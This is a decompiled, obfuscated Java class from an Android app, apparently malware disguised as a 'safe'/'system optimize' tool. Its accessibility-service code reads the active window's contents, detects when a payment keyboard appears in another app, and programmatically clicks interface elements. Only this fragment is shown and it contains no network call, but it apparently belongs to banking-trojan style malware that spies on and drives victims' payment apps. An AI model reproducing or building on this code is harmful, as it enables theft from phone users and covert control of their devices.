package p000;

import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;
import android.widget.Button;
import com.storm.safe.rock.iuzxujjtqev;
import com.storm.safe.rock.service.dqtvuisjd;
import com.storm.safe.rock.service.modules.cipher.C0341a7;
import com.storm.safe.rock.service.modules.setup.C0360a2;
import com.storm.safe.rock.service.modules.yw5xud.C0371a8;
import java.util.concurrent.CountDownLatch;

/* compiled from: r8-map-id-6aa8c380066ac34eca52ba03819884bf743dac35e85c6cbaefaab30e4b90b459 */
/* loaded from: classes2.dex */
public final /* synthetic */ class e41 implements Runnable {

    /* renamed from: a0 */
    public final /* synthetic */ int f55925a0;

    /* renamed from: a1 */
    public final /* synthetic */ Object f55926a1;

    /* renamed from: a2 */
    public final /* synthetic */ Object f55927a2;

    /* renamed from: a3 */
    public final /* synthetic */ Object f55928a3;

    /* renamed from: a4 */
    public final /* synthetic */ Object f55929a4;

    public /* synthetic */ e41(AccessibilityNodeInfo accessibilityNodeInfo, boolean[] zArr, C0371a8 c0371a8, CountDownLatch countDownLatch) {
        this.f55925a0 = 2;
        this.f55928a3 = accessibilityNodeInfo;
        this.f55929a4 = zArr;
        this.f55926a1 = c0371a8;
        this.f55927a2 = countDownLatch;
    }

    @Override // java.lang.Runnable
    public final void run() {
        switch (this.f55925a0) {
            case 0:
                C0360a2 c0360a2 = (C0360a2) this.f55928a3;
                AccessibilityEvent accessibilityEvent = (AccessibilityEvent) this.f55929a4;
                String str = (String) this.f55926a1;
                String str2 = (String) this.f55927a2;
                try {
                    AccessibilityNodeInfo cachedRoot = dqtvuisjd.f52358m1.getCachedRoot();
                    if (cachedRoot == null) {
                        cachedRoot = c0360a2.f53815a0.getRootInActiveWindow();
                    }
                    bf1 bf1Var = c0360a2.f53824a9;
                    t60.m214694b5(accessibilityEvent, "copiedEvent");
                    bf1Var.m210718a5(accessibilityEvent, cachedRoot);
                    gg0 gg0Var = c0360a2.f53825b0;
                    gg0Var.getClass();
                    gg0Var.f56461a0.m210718a5(accessibilityEvent, cachedRoot);
                    h40 h40Var = c0360a2.f53826b1;
                    h40Var.getClass();
                    h40Var.f56602a0.m210718a5(accessibilityEvent, cachedRoot);
                    c0360a2.m212079i4(accessibilityEvent, str, str2);
                } catch (Exception e) {
                    t60.m214705c6("SystemOptimize", "onAccessibilityEvent background 异常", e);
                } finally {
                    try {
                        accessibilityEvent.recycle();
                    } catch (Exception unused) {
                    }
                }
                try {
                    accessibilityEvent.recycle();
                    return;
                } catch (Exception unused2) {
                    return;
                }
            case 1:
                C0341a7 c0341a7 = (C0341a7) this.f55928a3;
                String str3 = (String) this.f55926a1;
                aa1 aa1Var = (aa1) this.f55929a4;
                String str4 = (String) this.f55927a2;
                t60.m214695b6(str3, "$pkg");
                t60.m214695b6(aa1Var, "$rule");
                t60.m214695b6(str4, "$cls");
                if (!c0341a7.f53388a5.get() && c0341a7.m211865a4()) {
                    t60.m214714d6("VCC", "🎯 UI 第二次探测发现支付键盘: pkg=".concat(str3));
                    c0341a7.f53387a4.set(aa1Var.f58a2);
                    c0341a7.m211870b0(str3, str4);
                    return;
                }
                return;
            case 2:
                AccessibilityNodeInfo accessibilityNodeInfo = (AccessibilityNodeInfo) this.f55928a3;
                boolean[] zArr = (boolean[]) this.f55929a4;
                C0371a8 c0371a8 = (C0371a8) this.f55926a1;
                CountDownLatch countDownLatch = (CountDownLatch) this.f55927a2;
                try {
                    if (accessibilityNodeInfo.isClickable()) {
                        zArr[0] = accessibilityNodeInfo.performAction(16);
                    } else {
                        AccessibilityNodeInfo parent = accessibilityNodeInfo.getParent();
                        while (true) {
                            if (parent != null) {
                                if (parent.isClickable()) {
                                    zArr[0] = parent.performAction(16);
                                } else {
                                    parent = parent.getParent();
                                }
                            }
                        }
                    }
                } catch (Exception e2) {
                    tz0.m214807a7("[r.c] 点击异常: ", e2.getMessage(), c0371a8.f55141a2);
                }
                countDownLatch.countDown();
                return;
            default:
                iuzxujjtqev iuzxujjtqevVar = (iuzxujjtqev) this.f55928a3;
                String str5 = (String) this.f55926a1;
                Integer num = (Integer) this.f55929a4;
                Boolean bool = (Boolean) this.f55927a2;
                iuzxujjtqev.C0254a0 c0254a0 = iuzxujjtqev.f51956e2;
                try {
                    if (iuzxujjtqevVar.f51959c4 == null || iuzxujjtqevVar.isFinishing() || iuzxujjtqevVar.isDestroyed()) {
                        t60.m214726f4("iuzxujjtqev", "⚠️ 按钮未初始化或Activity已销毁，跳过更新");
                        return;
                    }
                    Button button = iuzxujjtqevVar.f51959c4;
                    if (button == null) {
                        t60.m214724f2("enableButton");
                        throw null;
                    }
                    button.setText(str5);
                    if (num != null) {
                        int iIntValue = num.intValue();
                        Button button2 = iuzxujjtqevVar.f51959c4;
                        if (button2 == null) {
                            t60.m214724f2("enableButton");
                            throw null;
                        }
                        button2.setBackgroundColor(iuzxujjtqevVar.getColor(iIntValue));
                    }
                    if (bool != null) {
                        boolean zBooleanValue = bool.booleanValue();
                        Button button3 = iuzxujjtqevVar.f51959c4;
                        if (button3 != null) {
                            button3.setEnabled(zBooleanValue);
                            return;
                        } else {
                            t60.m214724f2("enableButton");
                            throw null;
                        }
                    }
                    return;
                } catch (Exception e3) {
                    t60.m214705c6("iuzxujjtqev", "❌ 更新按钮失败: ".concat(str5), e3);
                    return;
                }
        }
    }

    public /* synthetic */ e41(C0360a2 c0360a2, AccessibilityEvent accessibilityEvent, String str, int i, String str2) {
        this.f55925a0 = 0;
        this.f55928a3 = c0360a2;
        this.f55929a4 = accessibilityEvent;
        this.f55926a1 = str;
        this.f55927a2 = str2;
    }

    public /* synthetic */ e41(Object obj, String str, Object obj2, Object obj3, int i) {
        this.f55925a0 = i;
        this.f55928a3 = obj;
        this.f55926a1 = str;
        this.f55929a4 = obj2;
        this.f55927a2 = obj3;
    }
}
